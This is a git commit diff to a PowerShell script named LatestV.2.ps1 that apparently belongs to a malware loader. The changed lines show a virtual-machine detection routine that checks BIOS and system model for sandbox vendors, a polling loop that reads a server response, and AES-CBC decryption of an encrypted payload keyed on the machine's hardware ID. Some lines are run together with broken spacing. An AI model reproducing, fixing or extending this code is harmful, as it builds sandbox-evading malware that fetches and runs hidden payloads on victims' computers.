8530dffe28db21910b850def0c0314e7d932df6d
shinchan12513-lab <shinchan12513@gmail.com>
2026-09-20 01:54:13 +0700

    Update LatestV.2.ps1

--- LatestV.2.ps1
+++ LatestV.2.ps1
@@ -17,7 +17,7 @@ function Test-VirtualEnvironment {
     try {
         $bios = Get-CimInstance -ClassName Win32_BIOS -ErrorAction SilentlyContinue
         $comp = Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction SilentlyContinue$vmKeywords = @("VMware", "VirtualBox", "QEMU", "KVM", "Hyper-V", "Xen", "Parallels", "Virtual")
-        foreach ($kw in$vmKeywords) {
+        foreach ($kw in $vmKeywords) {
             if ($bios.Manufacturer -match$kw -or $comp.Model -match$kw -or $bios.SMBIOSBIOSVersion -match$kw) {
                 return $true
             }
@@ -133,7 +133,8 @@ while ($true) {
             if ($scriptResponse.success) {
                 if ($scriptResponse.encrypted) {
                     function Decrypt-Payload-CBC($encDataHex,$ivHex, $hwid) {$aes = [System.Security.Cryptography.Aes]::Create()
-                        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+                        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+                        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
                         
                         $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($hwid.PadRight(32, '0').Substring(0, 32))
                         
@@ -146,7 +147,8 @@ while ($true) {
                         }
                         $aes.IV =$ivBytes
                         
-                        if (($encDataHex.Length \% 2) -ne 0) {$encDataHex += "0"
+                        if (($encDataHex.Length % 2) -ne 0) {
+                        $encDataHex += "0"
                         }
 
                         $cipherBytes = New-Object byte[] ($encDataHex.Length / 2)
